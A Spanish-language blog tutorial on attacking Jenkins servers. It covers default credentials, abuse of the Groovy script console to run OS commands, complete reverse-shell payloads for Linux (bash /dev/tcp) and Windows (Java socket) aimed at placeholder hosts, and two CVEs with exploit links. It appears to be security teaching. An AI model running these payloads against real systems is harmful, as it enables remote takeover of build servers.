---
date: 2025-11-08T21:15:05.000Z
layout: post
comments: true
title: "Hacking Jenkins"
subtitle: 'Tipos de ataque'
description: >-
image: >-
  /images/jenkinslogo.png
optimized_image: >-
  /images/jenkinslogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - jenkins
  - CI
  - CD
  - 
author: Felipe Canales Cayuqueo
paginate: true
---

Jenkins es una herramienta de automatización de código abierto utilizada principalmente para la integración continua (CI) y la entrega continua (CD) de software. Permite compilar, probar y desplegar aplicaciones de forma automatizada cada vez que se realizan cambios en el código, lo que ayuda a detectar errores de manera temprana y mejorar la calidad del desarrollo. Gracias a su arquitectura basada en plugins, Jenkins puede integrarse con prácticamente cualquier tecnología o entorno de desarrollo, facilitando la implementación de pipelines completos que abarcan desde la compilación hasta el despliegue en producción. 

Jenkins se ejecuta por defecto en el puerto 8080 (Tomcat) y utiliza el puerto 5000 para la comunicación entre el servidor maestro y los nodos esclavos. Es posible que encontremos una instancia de Jenkins que utilice credenciales débiles o predeterminadas, como ```admin:admin``` o no tiene ningún tipo de autenticación habilitada.

La consola de scripts de Jenkins (puede estar ubicada en ```/computer/(master)/script```) permite ejecutar scripts Groovy directamente en el runtime del controlador; si se abusa de ella, es posible ejecutar comandos del sistema operativo en el servidor subyacente. Dado que Jenkins frecuentemente corre con privilegios elevados (root/SYSTEM). El código fuente de Groovy se compila en Java Bytecode y puede ejecutarse en cualquier plataforma que tenga JRE instalado.

Para ejecutar comandos a nivel del sistema en **Linux**, se debe escribir el siguiente código e ir reemplazando ```def cmd```:

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

En **Windows** se debe escribir el siguiente código:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Para obtener una reverse shell en **Linux**, ejecutamos el siguiente código reemplazando la IP y puerto correspondiente:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/puerto;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Para el caso de **Windows** sería lo siguiente:

```groovy
String host="IP";
int port=puerto;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Exploits

Existe una vulnerabilidad (CVE-2018-1999002) de lectura arbitraria de archivos en Jenkins 2.132 y versiones anteriores, 2.121.1 y versiones anteriores en el framework web Stapler, org/kohsuke/stapler/Stapler.java, que permite a los atacantes enviar solicitudes HTTP manipuladas que devuelven el contenido de cualquier archivo en el sistema de archivos maestro de Jenkins al que el maestro de Jenkins tenga acceso.

Existe otra vulnerabilidad (CVE-2019-1003000) de omisión de sandbox en el Script Security Plugin 1.49 y versiones anteriores en src/main/java/org/jenkinsci/plugins/scriptsecurity/sandbox/groovy/GroovySandbox.java que permite a los atacantes con la capacidad de proporcionar scripts en sandbox ejecutar código arbitrario en la JVM maestra de Jenkins.

> [Jenkins Plugin Script Security 1.49/Declarative 1.3.4/Groovy 2.60 - Remote Code Execution](https://www.exploit-db.com/exploits/46453)

> [CVE-2019-1003000-jenkins-RCE-PoC](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc)

